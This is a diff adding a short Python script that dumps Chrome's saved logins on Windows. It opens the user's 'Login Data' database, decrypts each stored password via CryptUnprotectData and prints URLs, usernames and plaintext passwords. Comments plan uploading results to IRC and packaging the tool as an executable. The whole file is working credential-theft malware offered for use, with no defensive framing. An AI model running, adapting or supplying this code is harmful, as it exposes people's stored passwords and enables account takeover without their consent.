@@ -1,0 +1,64 @@
+#Program: If chrome is installed gets user profile and dumps login data saved by chrome.
+# Python 3.X Windows
+#By INIT_6
+#TODO add linux support
+#TODO upload to IRC
+#TODO cx_Freeze #http://cx-freeze.sourceforge.net/
+
+import sqlite3 as lite
+import sys
+import getpass
+import win32crypt #http://sourceforge.net/projects/pywin32/files/pywin32/Build 218  ; http://jbarillari.blogspot.com/2009/06/security-lols.html
+
+
+def main():
+    if hasChrome() == True:
+        profileName = getProfileName()
+        databaseFile = getDatabase()
+        query = 'SELECT * FROM logins'
+        con = None
+        try:
+            
+            con = lite.connect(databaseFile)
+
+            cur = con.cursor()
+            cur.execute(query)
+
+            rows = cur.fetchall()
+            for row in rows:
+                print ( "URL: " + row[1] + \
+                        "\nUsername: " + row[3] + \
+                        "\nPassword: " + decrypt(row[5]) )
+                  
+            con.commit()
+
+        except lite.Error as e:
+
+            print ("Error %s:") % e.args[0]
+            sys.exit(1)
+
+        finally:
+
+            if con:
+                con.close()
+                
+def hasChrome():
+    #check to see if chrome is installed.
+    return True
+
+def getProfileName():
+    return getpass.getuser()
+
+def getDatabase():
+    #check windows install dir, check chrome install dir. build path and return.
+    path = 'C:\\users\\' + getProfileName() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
+    return path
+
+def decrypt(pwdHash):
+
+    output =  win32crypt.CryptUnprotectData(pwdHash,None,None,None,0)
+    
+    return output[1].decode('utf-8') 
+
+    
+main()
